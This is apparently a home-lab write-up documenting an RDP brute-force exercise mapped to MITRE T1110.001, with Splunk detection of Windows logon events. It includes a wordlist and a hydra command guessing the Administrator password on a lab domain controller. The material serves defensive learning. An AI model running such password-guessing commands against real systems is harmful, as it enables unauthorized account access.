# 02 — RDP Brute Force

## Overview

| Field           | Detail                                                                                       |
| --------------- | -------------------------------------------------------------------------------------------- |
| Status          | 🔜 Pending                                                                                   |
| Date            | 13 June 2026                                                                                 |
| Tier            | Beginner                                                                                     |
| Attacker        | kali-linux-attacker-vm (10.0.10.3)                                                           |
| Target          | win-dc (10.0.10.10)                                                                          |
| MITRE Tactic    | Credential Access                                                                            |
| MITRE Technique | [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/) |
| Tool            | hydra                                                                                        |
| Log Source      | Windows Security Event 4625                                                                  |
| Detection       | [detection/02-rdp-brute-force.md](../../detection/02-rdp-brute-force.md)                     |

---

## Attack Steps

```bash
# Create a small wordlist on Kali
echo -e 'password\nPassw0rd\nadmin123\nWelcome1\nTryHackMe123!' > pass.txt

# Brute force RDP login
hydra -t 1 -V -f -l Administrator -P pass.txt rdp://10.0.10.10
```

---

## Detection (summary)

Full SPL, alert settings, and notes are in the [detection file](../../detection/02-rdp-brute-force.md).

---

## Findings

| Field           | Result                                                         |
| --------------- | -------------------------------------------------------------- |
| Date            | 13 June 2026                                                   |
| Command used    | hydra -t 1 -V -f -l Administrator -P pass.txt rdp://10.0.10.10 |
| Events captured | 4624,4625                                                      |
| Alert triggered | Yes                                                            |

---

## Screenshots

> *(Add after completing)*

- `screenshots/01-attack.png`
- `screenshots/02-splunk-events.png`
- `screenshots/03-alert.png`

